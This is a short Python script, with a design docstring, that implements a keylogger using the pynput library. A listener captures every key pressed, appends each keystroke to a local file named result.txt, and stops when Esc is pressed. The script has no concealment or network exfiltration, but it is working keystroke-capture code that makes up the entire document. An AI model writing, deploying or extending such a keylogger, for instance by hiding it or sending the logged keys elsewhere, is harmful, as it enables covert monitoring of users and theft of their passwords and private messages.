"""
    - Create an empty list to store the keystrokes.
    - Create function on_press that is called every time a key is pressed to
        append the pressed key to k, write k to the result file and clear k.
    - Create function write_1 that takes a list of keystrokes and writes them to
        a result file.
    - Create function on release that is called every time a key is released, if 
        esc pressed, it returns false and stops the listener.
    - Create listener object, waits for keyboard input and passes the keystrokes to 
        the on_pressed function, it exists automatically when the on_release function 
        returns False. 
"""
from pynput.keyboard import Key, Listener
k = []

def on_press(key):
    k.append(key)
    write_1(k)
    k.clear()

def write_1(var):
    with open("result.txt", "a") as file:
        for i in var:
            new_var = str(i).replace("'", '')
            file.write(new_var)
            file.write("\n")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()